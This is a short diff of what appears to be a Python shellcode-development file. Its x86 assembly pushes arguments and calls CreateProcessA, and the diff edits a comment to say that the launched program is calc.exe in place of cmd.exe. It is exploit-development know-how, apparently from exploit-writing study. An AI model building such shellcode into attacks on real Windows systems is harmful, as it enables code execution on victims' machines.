@@ -139,7 +139,7 @@ CODE = (
     "  dec eax                          ;" # Null EAX
     "  push eax                         ;" # Push lpThreadAttributes
     "  push eax                         ;" # Push lpProcessAttributes
-    "  push ebx                         ;" # Push lpCommandLine // cmd.exe string
+    "  push ebx                         ;" # Push lpCommandLine // calc.exe string
     "  push eax                         ;" # Push lpApplicationName
     "  call dword ptr [ebp+0x18]        ;" # Call CreateProcessA
 
